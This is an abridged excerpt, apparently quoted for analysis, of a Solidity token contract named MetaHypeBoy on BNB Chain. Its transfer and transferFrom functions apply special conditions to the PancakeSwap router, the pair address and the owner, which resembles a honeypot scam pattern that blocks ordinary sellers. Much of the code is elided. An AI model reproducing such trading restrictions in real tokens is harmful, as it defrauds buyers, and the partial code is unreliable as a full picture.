...
contract MetaHypeBoy is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor() {
        ...
        _pancakePairAddress = IPancakeFactory(PancakeV2Factory).createPair(address(WBNB), address(this));
    }
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        if(_msgSender() == PancakeV2Router || _msgSender() == _pancakePairAddress || _pancakePairAddress == address(0) || _msgSender() == owner()) {
    ...
    function transferFrom(
        ...
        if(sender == PancakeV2Router || sender == _pancakePairAddress || _pancakePairAddress == address(0) || sender == owner()) {
